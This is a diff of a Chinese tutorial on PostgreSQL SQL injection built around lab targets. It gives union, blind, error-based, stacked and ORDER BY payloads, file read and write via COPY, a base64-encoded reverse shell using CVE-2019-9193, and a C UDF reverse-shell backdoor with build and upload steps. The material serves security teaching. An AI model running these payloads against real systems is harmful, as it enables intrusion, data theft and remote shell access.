@@ -1,5 +1,5 @@
 | 环境 | 版本 |
-| --- | --- |
+| :-: | :-- |
 | 服务器 | Linux |
 | 数据库 | PostgreSQL 11.13 (Debian 11.13-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit |
 | web | [https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) |
@@ -7,8 +7,10 @@
 |PostgreSQL |13.4|
 
 环境依然选择使用docker搭建postgresql，web使用burp的[靶场](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)来对三大注入方式(联合查询，盲注，报错注入)来进行讲解，在练习postgresql注入的同时，也需要本地环境，这里我使用官方提供的镜像来配合练习SQL语句，如果大家有更好的姿势，欢迎各位讨论
+
 ## 联合查询注入
 联合查询注入，和其他关系型数据库一致，需要存在注入的页面有明显的回显位，只是改变一些语法或者sql语句；其作用就是，在原来的查询的条件的基础上，通过关键字`union`,`union all`，从而拼接恶意SQL语句，将`union`后面的`select` 得到的结果将拼接到前个`select`的结果的后面
+
 > - 若回显仅支持一行数据的话，让`union`前边正常的查询语句返回的结果为空
 > - 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接
 
@@ -16,8 +18,13 @@
 
 - `union`: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序
 - `union all`: 对两个结果集进行并集操作，包括重复行，不进行排序；
+
+
+
 ### 注入流程
+
 这里以burp官方提供的[靶场](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)为例，在判断出注入点之后，注入流程如下：
+
 ```sql
 1. 确定字段的数量
 2. 确定页面回显位
@@ -29,15 +36,22 @@
   e.查询敏感信息
 ```
 #### 确定字段数量
+
 使用`order by`语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。
+
 ```sql
 select * from table_name from column_name = 'xxx' order by 3
 ```
 正常页面
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_05_2O4SEqoG.png)
+
 错误页面
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_yW92zpsx.png)
+
 所以这里确定该表字段数为3
+
 #### 确定页面回显位
 在这里知道了字段数为3，那么就要判断回显位了，使用`union select '1','2','3'`将定义的数字显示在页面上，就可以判断页面的回显位了
 注意：
@@ -46,19 +60,35 @@ select * from table_name from column_name = 'xxx' order by 3
 - 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一
 - 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示
 
+
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_uGxtOWmn.png)
+
+
+
 #### 查询数据
+
 通过前面2步，确定了字段数量以及页面回显位，首先就需要探测相关环境，如下所示：
+
 **探测版本**
+
 ```sql
 select version();
 ```
-![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_CP5svb9B.png)**探测当前用户**
+![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_CP5svb9B.png)
+
+**探测当前用户**
+
 ```sql
 select user;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_QIUpEhNy.png)
+
+
+
 **探测数据库/模式相关**
+
+
 
 ```sql
 -- 获取当前数据库
@@ -75,9 +105,13 @@ select string_agg(datname,',') from pg_database;
 select array_to_string(array_agg(datname),',') from pg_database;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_WxkhMQj3.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_06_yYLhBIqH.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_07_wxV0aXn8.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_07_k0SQlK5p.png)
+
 **获取当前数据库public模式下的表名**
 
 ```sql
@@ -86,20 +120,28 @@ select tablename from pg_tables where schemaname = 'public'
 select table_name from information_schema.tables where table_schema='public'
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_07_Au7PQgtN.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_07_MPS3eOU4.png)
+
 **获取products表里的列名**
+
 ```sql
 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public';
 select column_name from information_schema.columns where table_name = 'products';
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_07_nUusSFHy.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_08_OThBjCZe.png)
+
 **获取值**
 
 ```sql
 select name from products
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_08_DmXt457J.png)
+
+
+
 ## 盲注
 ### 布尔盲注
 postgresql 布尔盲注和其他数据库盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在/不存在两个结果，就可以判断是否存在布尔注入了。
@@ -126,10 +168,19 @@ postgresql 布尔盲注和其他数据库盲注一样，通过页面对带入数
   d. 依次求解，直到查询完表中所有的值
 ```
 #### 布尔盲注判断注入点
+
 **and 1=1 恒真**
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_08_dAgHFWb5.png)
+
+
+
 **and 1=2 恒假**
+
+
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_08_9hMIaEBR.png)
+
 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据
 
 #### 布尔盲注常用函数
@@ -137,46 +188,69 @@ postgresql 布尔盲注和其他数据库盲注一样，通过页面对带入数
 - ascii()
 - substring()/substr()
 - length()
+
+
+
 #### 布尔盲注手法
+
 **获取当前数据库的用户名**
-ascii('p') = 112
+
+`ascii('p') = 112`
+
 ```sql
 select * from xxx_table where xxx = 'xxx' and ascii(substring((select user),1,1)) = 112
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_08_naV0e1zd.png)
+
+
+
 依次对字符串求解，当截取到最后一位（+1）时会substring/substr()函数会返回空字符串，ascii对空处理会变成0
 所以当第9位为0成立，那么字符串长度为9-1=8位
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_09_TAyfE35Q.png)
+
 **获取所有的数据库/模式**
+
 ```sql
 --postgresql limit用法只能使用limit xx offset xx
 select datname from pg_database limit 1 offset 0;
 ```
 判断数据库个数
+
 ```sql
 select * from xxx_table where xxx = 'xxx' and 3=(select count(datname) from pg_database limit 1 offset 0)
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_09_qIEK1oH3.png)
+
 判断第一个数据库名的长度
 
 ```sql
 select * from xxx_table where xxx = 'xxx' and (select length(datname) from pg_database limit 1 offset 0) = 8
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_09_eguCK7hm.png)
+
 判断第一个数据库的字符
+
 ```sql
 select * from xxx_table where xxx = 'xxx' and ascii(substring((select datname from pg_database limit 1 offset 0),1,1)) = 112
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_09_D5M1N9Lk.png)
+
 依次猜解，可获取库/模式的名称，limit 语法固定使用limit xxx offset xxx来写
+
 **获取当前数据库的表**
+
 当前数据库为postgres，schema为public
+
 ```sql
 -- 首先获取当前数据库、模式下存在多少表
 select count(tablename) from pg_tables where schemaname = 'public'
 select count(table_name) from information_schema.tables where table_schema='public'
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_09_ZluYCQaI.png)
+
+
+
 ```sql
 -- 然后获取当前数据库，模式下某表的长度
 select length(tablename) from pg_tables where schemaname = 'public' limit 1 offset 0
@@ -189,38 +263,57 @@ select ascii(substring(tablename,1,1)) from pg_tables where schemaname = 'public
 select ascii(substring(table_name,1,1)) from information_schema.tables where table_schema = 'public' limit 1 offset 0
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_10_67pF4do0.png)
+
 **获取当前表的字段名**
+
 ```sql
 -- 首先获取当前字段的个数
 SELECT count(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public';
 select count(column_name) from information_schema.columns where table_name = 'products';
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_10_vWL8x1TE.png)
+
+
+
 ```sql
 -- 获取列名长度
 SELECT length(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0
 select length(column_name) from information_schema.columns where table_name = 'products' limit 1 offset 0;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_10_eG06xSJo.png)
+
+
+
 ```sql
 -- 获取列名值
 SELECT ascii(substr(attname,1,1)) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0;
 select ascii(substr(column_name,1,1)) from information_schema.columns where table_name = 'products' limit 1 offset 0;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_11_NfoPxS5r.png)
+
 **获取值**
+
 ```sql
 select count(id) from products;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_11_IF5rUTMW.png)
+
+
+
 ```sql
 select length(name) from products limit 1 offset 0;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_11_WARh5INs.png)
+
+
+
 ```sql
 select ascii(substr(name),1,1) from products limit 1 offset 0;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_11_lhayxZpB.png)
+
+
+
 ### 时间盲注
 #### 常用函数/表达式
 
@@ -245,16 +338,25 @@ postgres=#
 ```
 postgresql 时间盲注和其他数据库时间盲注类似，由于postgresql默认支持堆叠查询，首先在判断数据库时可以利用postgresql特有的pg_sleep()函数来快速判断是否是postgresql
 #### 堆叠查询判断数据库
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_E5mrOzFK.png)
+
+
+
 #### 时间盲注示例
 同布尔盲注流程一致，在case...when...then...else...end表达式内构造条件判断语句，如果正确执行pg_sleep(),否则不做任何操作，通过延时来获取数据
 ```sql
 select case when(ascii(substr((select datname from pg_database limit 1 offset 0),1,1))>97) then (select 1 from pg_sleep(5)) else 1 end
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_ApzyvitT.png)
+
 when中的表达式主要用于判断True或者False，同布尔盲注的判断条件
+
+
+
 ## 报错注入
 由于没有找到免费的在线环境，在这里我使用`node.js+express`快速搭建了一个web靶场，用于测试postgresql的报错注入，环境依赖node.js+postgresql，报错注入在postgresql其实不太常见，由于postgresql默认支持堆叠查询，所以通常使用堆叠查询就直接getshell了
+
 ```shell
 # 拉取postgresql 官方镜像
 sudo docker pull postgres
@@ -263,6 +365,7 @@ sudo docker run -p 5432:5432 --name postgres -e POSTGRES_PASSWORD=123456 -d post
 node app.js
 ```
 相关代码如下：
+
 ```javascript
 const express = require('express')
 const app = new express
@@ -313,11 +416,17 @@ app.listen(8080,() => {
 })
 ```
 结果如下：
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_RqBvKybM.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_K6vzYVju.png)
+
+
+
 ### CAST
 原理：类型转化报错
 **payload**
+
 ```sql
 AND 1=CAST((SELECT version()) AS int)
 ```
@@ -326,33 +435,47 @@ AND 1=CAST((SELECT version()) AS int)
 select * from users where id = '1' and cast((select version()) as int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_13_Uno4mCVl.png)
+
 **获取数据库用户**
+
 ```sql
 select * from users where id = '1' and cast((select user) as int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_13_RQkDFYM7.png)
+
 **获取数据库/模式**
+
 ```sql
 select * from users where id = '1' and cast((SELECT string_agg(datname,',')from pg_database) as int)=1
 select * from users where id = '1' and cast((SELECT string_agg(distinct schemaname,',')from pg_tables) as int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_13_6IgQmt7T.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_14_Y1nFRpDW.png)
+
 **获取当前数据库下public的表**
+
 ```sql
 select * from users where id = '1' and cast((SELECT string_agg(tablename,',') from pg_tables where schemaname='public') as int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_14_cKpmM0a8.png)
+
 **获取users表的列名**
+
 ```sql
 select * from users where id = '1' and cast((SELECT string_agg(column_name,',') from information_schema.columns where table_name='users') as int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_14_UOzkHIvK.png)
+
 **获取值**
+
 ```sql
 select * from users where id = '1' AND 7778=CAST((SELECT string_agg(username,',') from users)::text AS NUMERIC)
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_14_B7HIu32E.png)
+
+
+
 ### ::运算符
 原理：用于值或字段之后，效果同 cast，但在语法上简便许多，在需要进行多次转换进行报错的时候无疑是很方便的
 ```sql
@@ -364,16 +487,23 @@ select '1'::text::int
 select * from users where id = '1' and (select user::int)=1
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_15_9uTrvkRy.png)
+
 通过报错注入获取其他数据同cast方式一样，修改核心查询语句即可
+
 ## 堆叠注入
 postgresql和mssql一样，默认支持多语句，闭合前语句，再使用`;`分隔前后的语句，以达到堆叠查询的目的。
+
 由于堆叠查询的特殊性，也可以利用postgresql的特殊函数`pg_sleep()`快速判断是否是postgresql
+
 **payload**
+
 ```sql
 ?id=1';select pg_sleep(5)--
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_15_QWt29zFm.png)
+
 在判断出注入点以及是postgresql且可堆叠查询的情况下，可以使用`CVE-2019-9193`，执行任意命令，反弹shell，从版本[9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)开始，Postgres新增了一个“[COPY TO/FROM PROGRAM](https://paquier.xyz/postgresql-2/postgres-9-3-feature-highlight-copy-tofrom-program/)”功能。这个功能简单来说就是允许数据库的超级用户以及`pg_read_server_files`组中的任何用户执行操作系统命令
+
 ```sql
 --完整sql语句
 DROP TABLE IF EXISTS cmd_exec;
@@ -384,11 +514,18 @@ COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg
 select * from cmd_exec;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_15_0x9jgLAF.png)
+
+
+
 在web中由于`+`号会被认为是空格，就会导致字符串被拆解，无法利用，需要对`+`号进行一次url编码，完整payload如下
+
 ```sql
 ?id=1';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA%2bIC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ==|base64 -d|bash';--
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_16_L3o0nBIF.png)
+
+
+
 ## Order by 注入
 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到`order by`排序，`order by`在select语句中，紧跟在`where [where condition]`后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟`column_name`，而预编译是参数化字符串，而`order by`后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。
 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误
@@ -401,17 +538,26 @@ if (sort === undefined) {
 let sql = `select * from users order by ${sort}`
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_16_JkAQK4Sj.png)
-postgresql 的order by 注入，涉及条件相当复杂，由于postgresql order by 后面要紧跟true，或者false，需要使用case...when...then...else...end表达式嵌套SELECT和CASE WHEN语句，直到可以将"布尔盲注成功利用，然后睡眠5秒"转换为"true或false"
+
+`postgresql` 的`order by `注入，涉及条件相当复杂，由于`postgresql order by `后面要紧跟`true`，或者`false`，需要使用`case...when...then...else...end`表达式嵌套`SELECT`和`CASE WHEN`语句，直到可以将"布尔盲注成功利用，然后睡眠5秒"转换为"true或false"
+
 ```sql
 select case when((select case when(select user = 'postgres') then (select true from PG_SLEEP(5)) else false end)) then true else false end
 select case when(select user = 'postgres') then (select 1 from pg_sleep(2)) else 1 end
 
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_16_1aySzHwo.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_17_HYqtC8jm.png)
+
 如果开启了报错回显，那么可以利用报错注入获取信息
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_17_iUZe1cOT.png)
+
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_17_aRzKZISb.png)
+
+
+
 ## 二次注入
 场景见MySQL注入基础二次注入
 ## HTTP头部注入
@@ -427,28 +573,36 @@ COPY test FROM '/etc/passwd';
 SELECT * FROM test limit;
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_18_Nt7QgSkV.png)
+
 ### 写
 copy 命令写入
 ```sql
 COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
 ```
 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_18_3DCt8QyI.png)
+
+
+
 ## 命令执行
 以下是摘抄自[渗透中利用postgresql getshell](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/)的，暂未复现
 ### 低版本的命令执行
 可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6
+
 一般**8.2**以下的版本可以
+
 ```sql
 CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;
 CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT;
 ```
 直接可以执行
+
 ```sql
 select system('id');
 ```
 ### 高版本的命令执行
 #### CVE-2019-9193
-见堆叠注入
+见堆叠注
+
 #### 其他
 当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行
 ```sql
@@ -460,9 +614,13 @@ HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro
 select * from pg_language;
 ```
 如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章:
+
 [http://static.hx99.net/static/drops/tips-6449.html](http://static.hx99.net/static/drops/tips-6449.html)
+
 当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门
+
 编译反弹shell后门
+
 ```c
 #include "postgres.h"
 #include "fmgr.h"
@@ -479,17 +637,22 @@ text *exec()
 
 ```
 编译环境需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库
+
 ```shell
 gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so
 strip -sx udf.so #缩减so文件大小
 ```
 将文件hex后去除\n
+
 ```shell
 cat udf.so | xxd -ps | tr -d "\n"
 ```
 接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑.
+
 为什么不能小于2048?是因为在postgresql高版本处理中,**如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败**.
+
 用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割：
+
 ```sql
 #~/usr/bin/env python 2.7
 #-*- coding:utf-8 -*-
@@ -517,14 +680,25 @@ if __name__ == "__main__":
 
 ```
 分割完成后按照下文中的sql语句执行：
+
 1.写入对象
+
 2.创建文件
+
 3.建立函数
+
 4.执行命令
+
 5.清理函数
+
 如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数：
+
 [https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c](https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c)
+
 这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码）
+
+
+
 ```sql
 SELECT lo_create(9023);
 
